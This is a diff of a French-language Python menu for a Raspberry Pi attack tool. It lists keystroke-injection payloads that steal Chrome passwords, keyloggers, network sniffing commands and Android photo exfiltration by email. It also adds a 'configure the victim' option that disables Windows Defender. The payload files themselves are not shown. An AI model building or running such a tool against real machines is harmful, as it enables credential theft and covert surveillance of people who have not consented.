@@ -38,28 +38,32 @@ banner = """
 # Structure des actions possibles via l'application
 menu = {
     '1': ['Injection de frappes', {
-        '1': ['Kubuntu - Désactive network manager & force réseau ethernet', 'payloads/linux-network.dd'],
-        '2': ['Kubuntu - Récupère les mots de passe de Chrome', 'payloads/kubuntu-chrome-password.dd'],
-        '3': ['Kubuntu - Vérifie l\'injecteur de frappes opérationnel', 'payloads/kubuntu-test.dd'],
-        '4': ['Windows - Désactive scan Windows Defender de la Pi', 'payloads/windows-defender.dd'],
-        '5': ['Windows - Récupère les mots de passe de Chrome', 'payloads/windows-chrome-password.dd'],
-        '6': ['Windows - Vérifie l\'injecteur de frappes opérationnel', 'payloads/windows-test.dd'],
+        '1': ['Kubuntu - Vérifie l\'injecteur de frappes opérationnel', 'payloads/kubuntu-test.dd'],
+        '2': ['Windows - Vérifie l\'injecteur de frappes opérationnel', 'payloads/windows-test.dd'],
+        '3': ['Kubuntu - Récupère les mots de passe de Chrome', 'payloads/kubuntu-chrome-password.dd'],
+        '4': ['Windows - Récupère les mots de passe de Chrome', 'payloads/windows-chrome-password.dd'],
+        '5': ['Android - Envoi par email une photo du téléphone', 'payloads/android-mail.dd'],
+        '6': ['Android - Lance de la musique depuis l\'App Musique', 'payloads/android-musique.dd'],
         '7': ['Executer son propre payload', 'payloads/'],
     }],
     '2': ['Keylogger [Windows|Linux]', {
-        '1': ['Windows Keylogger sans mail', 'keyloggers/keylogger-windows.dd','enregistré sur la Pi'],
-        '2': ['Kubuntu Keylogger sans mail', 'keyloggers/keylogger-linux.dd','enregistré sur la Pi'],
-        '3': ['Kubuntu Keylogger avec mail', 'keyloggers/keylogger-linux-smtp.dd','envoyé par mail'],
+        '1': ['Windows Keylogger sans mail', 'payloads/keylogger-windows.dd','enregistré sur la Pi'],
+        '2': ['Kubuntu Keylogger sans mail', 'payloads/keylogger-linux.dd','enregistré sur la Pi'],
+        '3': ['Kubuntu Keylogger avec mail', 'payloads/keylogger-linux-smtp.dd','envoyé par mail'],
     }],
     '3': ['MITM Ethernet - Écoute du réseau', {
         '1': ['Tshark - Ecoute l\'interface usb0', ['sudo','tshark', '-i', 'usb0', '-w', '/home/pi/pcap/tshark.pcap']],
         '2': ['Tcpdump - Ecoute de l\'intrface usb0', ['sudo', 'tcpdump', '-i', 'usb0', '-tttt', '-w', 'pcap/tcpdump.pcap']],
-        '3': ['Tcpdump - Ecoute de l\'intrface usb0 filtrer port 80', ['sudo', 'tcpdump', '-i', 'usb0', '-tttt', '-w', 'pcap/tcpdump_80.pcap', 'port', '443']],
+        '3': ['Tcpdump - Ecoute de l\'intrface usb0 filtrer port 80', ['sudo', 'tcpdump', '-i', 'usb0', '-tttt', '-w', 'pcap/tcpdump_443.pcap', 'port', '443']],
     }],
     '4': ['MITM USB - Attaque sur un smartphone', {
         '1': ['Injection de frappes', 'payloads/'],
         '2': ['[Samsung Android 9] Récupération de données - Copie d\'une image envoyée par email', 'payloads/android-mail.dd'],
         '3': ['[Indisponible] Scan USB communication']
+    }],
+    '5': ['Configurer la victime', {
+        '1': ['Windows - Désactive WinDef + Wi-Fi interface + Get Path Stockage Pi by Email', 'payloads/windows-config.dd'],
+        '2': ['Kubuntu - Désactive interface WiFi & force réseau ethernet', 'payloads/linux-network.dd'],
     }],
 }
 
@@ -300,3 +304,5 @@ if __name__ == '__main__':
         elif menu[choice][0] == 'MITM USB - Attaque sur un smartphone':
             mitm_usb(menu[choice][1])
 
+        elif menu[choice][0] == 'Configurer la victime':
+            injection(menu[choice][1])
